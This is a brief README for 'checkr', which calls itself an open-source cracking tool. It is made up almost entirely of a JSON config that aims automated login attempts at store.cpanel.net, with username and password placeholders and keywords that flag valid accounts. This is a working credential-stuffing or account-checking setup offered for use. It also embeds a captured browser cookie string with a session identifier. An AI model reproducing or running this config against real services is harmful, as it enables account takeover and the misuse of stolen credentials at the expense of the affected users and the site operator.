# checkr
Open-source cracking tool.



Config example
```json
    { "config": {
        "name": "CPanel Store Config - example",
        "author": "Br0keh",
        "requests": [
          {
            "method": "POST",
            "url": "https://store.cpanel.net/login/authenticate",
            "headers": {
              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
              "Connection": "keep-alive",
              "Cookie": "_ga=GA1.2.322431008.1568466385; gdpr_cookie_consent=allow; _fbp=fb.1.1568468440153.1527902114; CPSESSIONID=3aa06c9af6a28edf77ce5e031cc84af1; _gid=GA1.2.925743693.1569452404; _gat_gtag_UA_27582338_28=1",
              "Host": "store.cpanel.net",
              "Referer": "https://store.cpanel.net/login/?redirect=%2fmy%2f",
              "Upgrade-Insecure-Requests": "1",
              "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
            },
            "isFinalRequest": true,
            "postfields": "action=login&json=1&username=<USER>&password=<PASS>",
            "json_postfields": false,
            "json_response": true,
            "keywords": {
                "success": ["success"],
                "fail": ["Invalid username or password"]
            }
          }
        ]
      } 
    }
```